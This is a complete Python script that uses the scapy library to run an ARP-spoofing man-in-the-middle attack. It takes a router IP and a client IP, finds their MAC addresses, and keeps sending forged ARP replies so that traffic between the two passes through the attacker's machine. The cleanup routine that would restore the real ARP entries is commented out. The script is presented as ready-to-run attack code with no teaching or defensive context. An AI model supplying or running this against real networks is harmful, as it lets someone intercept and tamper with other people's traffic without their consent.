#!/usr/bin/python

#If you're on linux, don't forget to flush the IP tables

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0
import time, sys
import commands
bash=commands.getoutput

if len(sys.argv) != 3:
	sys.exit("Usage: " + sys.argv[0] + " <router IP> <client IP>")

def originalMAC(ip):
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2)
	for snd,rcv in ans:
		return rcv.sprintf("%Ether.src%")

def poison(routerIP, clientIP):
	send(ARP(op=2, pdst=clientIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff"))
	send(ARP(op=2, pdst=routerIP, psrc=clientIP, hwdst="ff:ff:ff:ff:ff:ff"))

def restore(routerIP, clientIP, routerMAC, clientMAC):
	send(ARP(op=2, pdst=routerIP, dst=clientIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC))
	send(ARP(op=2, pdst=clientIP, dst=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=clientMAC))

def main():

	print "Router IP = " + sys.argv[1]
	print "Client IP = " + sys.argv[2]
	print "Ctrl+C to exit"

	try: 
		routerMAC = originalMAC(sys.argv[1])
		print "\nThis is the routerMAC: " + routerMAC
		clientMAC = originalMAC(sys.argv[2])
		print "\nThis is the clientMAC: " + clientMAC
	except:
		sys.exit("Could not get MAC addresses")

	while 1:
#		try:
		poison(sys.argv[1], sys.argv[2])
		time.sleep(2)
#		except KeyboardInterrupt:
#			restore(sys.argv[1], sys.argv[2], routerMAC, clientMAC)
#			sys.exit("Goodbye")

if __name__ == "__main__":
	main()
